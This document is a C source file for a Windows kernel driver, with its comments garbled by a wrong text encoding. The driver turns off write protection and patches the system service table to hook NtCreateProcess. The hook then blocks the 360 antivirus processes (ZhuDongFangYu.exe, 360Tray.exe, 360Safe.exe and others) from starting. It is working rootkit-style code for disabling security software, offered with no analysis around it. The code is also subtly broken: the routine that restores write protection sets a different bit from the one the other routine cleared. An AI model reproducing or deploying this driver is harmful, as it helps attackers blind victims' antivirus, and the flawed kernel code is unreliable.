#include <ntddk.h>

//�洢ԭ���ĺ�����ַ
ULONG uOldNtCreateProcess;
NTSTATUS
	IoQueryFileDosDeviceName(
	IN PFILE_OBJECT  FileObject,
	OUT POBJECT_NAME_INFORMATION  *ObjectNameInformation
	); 
typedef NTSTATUS (*NTCREATEPROCESS)(
	__out PHANDLE ProcessHandle,
	__in ACCESS_MASK DesiredAccess,
	__in_opt POBJECT_ATTRIBUTES ObjectAttributes,
	__in HANDLE ParentProcess,
	__in ULONG Flags,
	__in_opt HANDLE SectionHandle,
	__in_opt HANDLE DebugPort,
	__in_opt HANDLE ExceptionPort,
	__in ULONG JobMemberLevel
	);
void PageProtectOn()
{
	__asm
	{
		//�ָ��ڴ汣��
		mov eax,cr0
			or eax,100000h
			mov cr0,eax
			sti
	}
}
void PageProtectOff()
{
	__asm
	{
		//ȥ���ڴ汣��
		cli
			mov eax,cr0
			and	eax,not	10000h
			mov cr0,eax
	}
}

//1.�ҵ�ϵͳ�����������ַ��
typedef struct _KSYSTEM_SERVICE_TABLE
{
	PULONG ServiceTableBase;						//��������ַ���ַ
	PULONG ServiceCounterTableBase;					
	ULONG  NumberOfService;							//�������ĸ���
	PULONG ParamTableBase;							//�������������ַ
}KSYSTEM_SERVICE_TABLE,*PKSYSTEM_SERVICE_TABLE;
typedef struct _KSERVICE_TABLE_DESCRIPTIOR
{
	KSYSTEM_SERVICE_TABLE ntoskrnl;	//ntoskrnl�ķ�����
	KSYSTEM_SERVICE_TABLE win32k;	//win32k.sys�ķ�����
	KSYSTEM_SERVICE_TABLE notUsed1;
	KSYSTEM_SERVICE_TABLE notUsed2;
}KSERVICE_TABLE_DESCRIPTOR,*PKSERVICE_TABLE_DESCRIPTOR;

//������ntoskrnl�������� SSDT
extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;

NTSTATUS   GetFullName(HANDLE     KeyHandle,char   *fullname);
//2.׼�������滻�ĺ���
NTSTATUS MyCreateProcess(
	__out PHANDLE ProcessHandle,
	__in ACCESS_MASK DesiredAccess,
	__in_opt POBJECT_ATTRIBUTES ObjectAttributes,
	__in HANDLE ParentProcess,
	__in ULONG Flags,
	__in_opt HANDLE SectionHandle,
	__in_opt HANDLE DebugPort,
	__in_opt HANDLE ExceptionPort,
	__in ULONG JobMemberLevel
	)
{
	char filename[1024];
	GetFullName(SectionHandle,filename);
	if(strstr(filename,"ZhuDongFangYu.exe") != NULL || strstr(filename,"360Tray.exe") != NULL||strstr(filename,"360speedld.exe") != NULL||strstr(filename,"360Safe.exe") != NULL||strstr(filename,"LiveUpdate360.exe") != NULL)
		return STATUS_UNSUCCESSFUL;
	return ((NTCREATEPROCESS)uOldNtCreateProcess)(ProcessHandle,DesiredAccess,ObjectAttributes,ParentProcess,Flags,SectionHandle,DebugPort,ExceptionPort,JobMemberLevel);
}

//3.�޸ĺ�����ַ
NTSTATUS HookNtCreatProcess()
{
	NTSTATUS Status;
	Status = STATUS_SUCCESS;
	PageProtectOff();

	uOldNtCreateProcess = KeServiceDescriptorTable->ntoskrnl.ServiceTableBase[0x30];

	KeServiceDescriptorTable->ntoskrnl.ServiceTableBase[0x30] = (ULONG)MyCreateProcess;

	PageProtectOn();

	return Status;
}

//4.�ָ�
VOID UnHookNtCreateProcess()
{
	PageProtectOff();

	KeServiceDescriptorTable->ntoskrnl.ServiceTableBase[0x30] = (ULONG)uOldNtCreateProcess;

	PageProtectOn();
}


//ж�غ���
void DriverUnload(PDRIVER_OBJECT driver)
{
	//DbgPrint("��������ֹͣ������.\r\n");
	UnHookNtCreateProcess();
}
//������������
NTSTATUS DriverEntry(PDRIVER_OBJECT driver,PUNICODE_STRING reg_path)
{
	HookNtCreatProcess();
	driver->DriverUnload = DriverUnload;
	return STATUS_SUCCESS;
}

NTSTATUS   GetFullName(HANDLE     KeyHandle,char   *fullname)   
{   
NTSTATUS ns;   
PVOID pKey=NULL,pFile=NULL;   
UNICODE_STRING fullUniName;   
ANSI_STRING akeyname;   
ULONG actualLen;   
UNICODE_STRING dosName;   

fullUniName.Buffer=NULL;   
fullUniName.Length=0;   
fullname[0]=0x00;   
ns=   ObReferenceObjectByHandle(   KeyHandle,   0,   NULL,   KernelMode,   &pKey,   NULL   )   ;   
if(   !NT_SUCCESS(ns))   return   ns;   

fullUniName.Buffer   =   ExAllocatePool(   PagedPool,   1024*2);//1024*2   
fullUniName.MaximumLength   =   1024*2;   

__try   
{   
pFile=(PVOID)*(ULONG   *)((char   *)pKey+20);   
pFile=(PVOID)*(ULONG   *)((char   *)pFile);   
pFile=(PVOID)*(ULONG   *)((char   *)pFile+36);   


ObReferenceObjectByPointer(pFile,   0,   NULL,   KernelMode);   
RtlVolumeDeviceToDosName(((PFILE_OBJECT)pFile)->DeviceObject,&dosName);     
RtlCopyUnicodeString(&fullUniName,   &dosName);   
RtlAppendUnicodeStringToString(&fullUniName,&((PFILE_OBJECT)pFile)->FileName);   

ObDereferenceObject(pFile);   
ObDereferenceObject(pKey   );   

RtlUnicodeStringToAnsiString(   &akeyname,   &fullUniName,   TRUE   );   
if(akeyname.Length<1024)     
{   
memcpy(fullname,akeyname.Buffer,akeyname.Length);   
fullname[akeyname.Length]=0x00;   
}   
else   
{   
memcpy(fullname,akeyname.Buffer,1024);   
fullname[1024-1]=0x00;   
}   

RtlFreeAnsiString(   &akeyname   );   
ExFreePool(dosName.Buffer);   
ExFreePool(   fullUniName.Buffer   );   

return   STATUS_SUCCESS;   

}   
__except(1)   
{   
if(fullUniName.Buffer)   ExFreePool(   fullUniName.Buffer     );   
if(pKey)   ObDereferenceObject(pKey   );   
return   STATUS_SUCCESS;   
}   
}   

